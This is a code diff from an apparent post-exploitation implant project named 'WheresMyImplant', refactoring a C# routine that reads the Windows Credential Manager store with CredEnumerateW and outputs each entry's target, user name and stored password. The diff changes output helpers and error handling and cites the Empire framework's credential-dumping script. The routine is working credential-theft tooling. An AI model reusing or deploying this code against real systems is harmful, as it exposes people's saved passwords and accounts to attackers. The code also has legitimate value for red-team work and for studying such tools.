@@ -24,12 +24,29 @@ namespace WheresMyImplant
             IntPtr hCredential;
             if (!advapi32.CredEnumerateW(null, 0, out count, out hCredential))
             {
-                Console.WriteLine("Unable to read");
-                Console.WriteLine(Marshal.GetLastWin32Error());
-                Console.WriteLine(count);
+                WriteOutputBad(String.Format("CredEnumerateW Failed, Read {0}", count));
                 return;
             }
 
+            try
+            {
+                ReadCredentials(hCredential, count);
+            }
+            catch (Exception error)
+            {
+                WriteOutputBad(error.ToString());
+            }
+            finally
+            {
+                advapi32.CredFree(hCredential);
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        // 
+        ////////////////////////////////////////////////////////////////////////////////
+        private void ReadCredentials(IntPtr hCredential, Int32 count)
+        {
             WinCred._CREDENTIAL[] credentialObject = new WinCred._CREDENTIAL[count];
             for (Int32 i = 0; i < count; i++)
             {
@@ -38,17 +55,17 @@ namespace WheresMyImplant
                 {
 
                     WinCred._CREDENTIAL credential = (WinCred._CREDENTIAL)Marshal.PtrToStructure(hTemp, typeof(WinCred._CREDENTIAL));
-                    Console.WriteLine("{0,-20} {1,-20}", "Flags", credential.Flags);
-                    Console.WriteLine("{0,-20} {1,-20}", "Type", credential.Type);
-                    Console.WriteLine("{0,-20} {1,-20}", "TargetName", PrintIntPtr(credential.TargetName));
-                    Console.WriteLine("{0,-20} {1,-20}", "Comment", PrintIntPtr(credential.Comment));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Flags", credential.Flags));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Type", credential.Type));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "TargetName", PrintIntPtr(credential.TargetName)));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Comment", PrintIntPtr(credential.Comment)));
 
                     //https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1
                     Int64 lastWritten = credential.LastWritten.dwHighDateTime;
                     lastWritten = (lastWritten << 32) + credential.LastWritten.dwLowDateTime;
-                    Console.WriteLine("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(lastWritten));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(lastWritten)));
 
-                    Console.WriteLine("{0,-20} {1,-20}", "Password Size", credential.CredentialBlobSize);
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Password Size", credential.CredentialBlobSize));
                     String credentialBlob;
                     if (0 < credential.CredentialBlobSize)
                     {
@@ -59,16 +76,17 @@ namespace WheresMyImplant
                         credentialBlob = PrintIntPtr(credential.CredentialBlob);
                     }
 
-                    Console.WriteLine("{0,-20} {1,-20}", "Password", credentialBlob);
-                    Console.WriteLine("{0,-20} {1,-20}", "Persist", credential.Persist);
-                    Console.WriteLine("{0,-20} {1,-20}", "AttributeCount", credential.AttributeCount);
-                    Console.WriteLine("{0,-20} {1,-20}", "Attributes", credential.Attributes);
-                    Console.WriteLine("{0,-20} {1,-20}", "TargetAlias", PrintIntPtr(credential.TargetAlias));
-                    Console.WriteLine("{0,-20} {1,-20}", "UserName", PrintIntPtr(credential.UserName));
-                    Console.WriteLine("");
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Password", credentialBlob));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Persist", credential.Persist));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "AttributeCount", credential.AttributeCount));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "Attributes", credential.Attributes));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "TargetAlias", PrintIntPtr(credential.TargetAlias)));
+                    WriteOutput(String.Format("{0,-20} {1,-20}", "UserName", PrintIntPtr(credential.UserName)));
+                    WriteOutput(String.Format(""));
                 }
                 catch (Exception error)
                 {
+                    WriteOutputBad(error.ToString());
                 }
                 finally
                 {
@@ -82,20 +100,21 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         private static String PrintIntPtr(IntPtr input)
         {
-            String output = "";
-            if (IntPtr.Zero != input)
+            String output = String.Empty;
+            if (IntPtr.Zero == input)
             {
-                try
-                {
-                    output = Marshal.PtrToStringUni(input);
-                }
-                catch (AccessViolationException)
-                {
-                    output = "error";
-                }
+                return output;
+            }
+
+            try
+            {
+                output = Marshal.PtrToStringUni(input);
+            }
+            catch (AccessViolationException error)
+            {
+                output = error.ToString();
             }
             return output;
         }
-
     }
 }
